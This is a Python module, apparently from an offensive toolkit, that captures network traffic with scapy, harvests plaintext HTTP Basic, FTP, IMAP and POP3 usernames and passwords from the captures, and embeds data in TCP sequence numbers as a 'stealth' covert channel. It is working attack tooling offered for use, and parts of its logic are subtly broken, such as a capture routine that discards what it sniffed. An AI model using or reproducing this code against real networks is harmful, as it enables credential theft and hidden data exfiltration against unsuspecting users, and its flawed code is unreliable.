# modules/network_sniffer_ext.py

import scapy.all as scapy
import threading
import os
import subprocess
import time
import logging
import base64

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

_sniffer_thread = None
_sniffer_stop = threading.Event()
_capture_file = None

def _sniff_worker(interface: str, capture_file: str):
    """
    Captures packets on `interface` and writes to `capture_file`.
    """
    try:
        logging.info(f"Starting packet capture on interface: {interface}")
        scapy.sniff(iface=interface, prn=lambda pkt: pkt.summary(), stop_filter=lambda p: _sniffer_stop.is_set(), store=True)
        scapy.wrpcap(capture_file, scapy.sniff(iface=interface, count=0, timeout=10))
        logging.info(f"Packet capture saved to: {capture_file}")
    except Exception as e:
        logging.error(f"Error during packet capture: {e}")

def start_sniffing(interface: str, config: dict = None, task_queue=None):
    """
    Starts packet capture on `interface`. 
    Each packet is analyzed for credentials (e.g. HTTP BASIC, FTP, etc.) in real‐time.
    """
    global _sniffer_thread, _capture_file
    if _sniffer_thread and _sniffer_thread.is_alive():
        return "[!] Sniffer already running."

    if not interface:
        logging.error("No interface specified for sniffing.")
        return "[!] No interface specified."

    _capture_file = f"sniffer_{interface}_{int(time.time())}.pcap"
    _sniffer_stop.clear()
    _sniffer_thread = threading.Thread(target=_sniff_worker, args=(interface, _capture_file), daemon=True)
    _sniffer_thread.start()
    logging.info(f"Sniffer started on interface: {interface}")
    return f"[*] Sniffer started on {interface}"

def stop_sniffing():
    """
    Stops the packet capture thread.
    """
    try:
        if not _sniffer_thread or not _sniffer_thread.is_alive():
            logging.warning("No sniffer is currently running.")
            return "[!] No sniffer is currently running."

        _sniffer_stop.set()
        _sniffer_thread.join()
        logging.info("Sniffer stopped successfully.")
        return "[*] Sniffer stopped"
    except Exception as e:
        logging.error(f"Error stopping sniffer: {e}")
        return "[!] Error stopping sniffer."

def extract_credentials_from_sniff() -> dict:
    """
    Parses the latest pcap file for common plaintext credentials (e.g. HTTP Basic, FTP, IMAP, POP3).
    """
    try:
        if not _capture_file or not os.path.exists(_capture_file):
            logging.error("No capture file found to extract credentials.")
            return {"error": "No capture file found."}

        logging.info(f"Parsing capture file: {_capture_file}")
        packets = scapy.rdpcap(_capture_file)
        credentials = {"http_basic": [], "ftp": [], "imap": [], "pop3": []}

        for pkt in packets:
            if pkt.haslayer(scapy.Raw):
                payload = pkt[scapy.Raw].load.decode(errors="ignore")
                # Extract HTTP Basic credentials
                if "Authorization: Basic" in payload:
                    try:
                        creds = payload.split("Authorization: Basic ")[1].split("\r\n")[0]
                        decoded_creds = base64.b64decode(creds).decode()
                        credentials["http_basic"].append(decoded_creds)
                    except Exception as e:
                        logging.warning(f"Failed to decode HTTP Basic credentials: {e}")
                # Extract FTP credentials
                if "USER" in payload and "PASS" in payload:
                    try:
                        user = payload.split("USER ")[1].split("\r\n")[0]
                        passwd = payload.split("PASS ")[1].split("\r\n")[0]
                        credentials["ftp"].append((user, passwd))
                    except Exception as e:
                        logging.warning(f"Failed to extract FTP credentials: {e}")
                # Extract IMAP credentials
                if "LOGIN" in payload and "OK" in payload:
                    try:
                        user = payload.split("LOGIN ")[1].split(" ")[0]
                        passwd = payload.split("LOGIN ")[1].split(" ")[1].split("\r\n")[0]
                        credentials["imap"].append((user, passwd))
                    except Exception as e:
                        logging.warning(f"Failed to extract IMAP credentials: {e}")
                # Extract POP3 credentials
                if "USER" in payload and "PASS" in payload and "+OK" in payload:
                    try:
                        user = payload.split("USER ")[1].split("\r\n")[0]
                        passwd = payload.split("PASS ")[1].split("\r\n")[0]
                        credentials["pop3"].append((user, passwd))
                    except Exception as e:
                        logging.warning(f"Failed to extract POP3 credentials: {e}")

        logging.info("Credentials extracted successfully.")
        return credentials
    except Exception as e:
        logging.error(f"Error extracting credentials: {e}")
        return {"error": "Failed to extract credentials."}

def stealth_tcp_steganography(data: str = "", output: str = None) -> str:
    """
    Embeds `data` into the TCP initial sequence numbers of crafted packets.
    Writes to a pcap, returns path.
    """
    try:
        if not data:
            logging.error("No data provided for steganography.")
            return "[!] No data provided."

        out = output or f"steg_tcp_{int(time.time())}.pcap"
        payload = data.encode("utf-8")
        pkt = scapy.IP(dst="10.0.0.1") / scapy.TCP(dport=80, seq=int.from_bytes(payload[:4].ljust(4, b'\x00'), "big"))
        scapy.wrpcap(out, [pkt])
        logging.info(f"Steganography data embedded successfully. Output: {out}")
        return out
    except Exception as e:
        logging.error(f"Error during TCP steganography: {e}")
        return "[!] Error during TCP steganography."
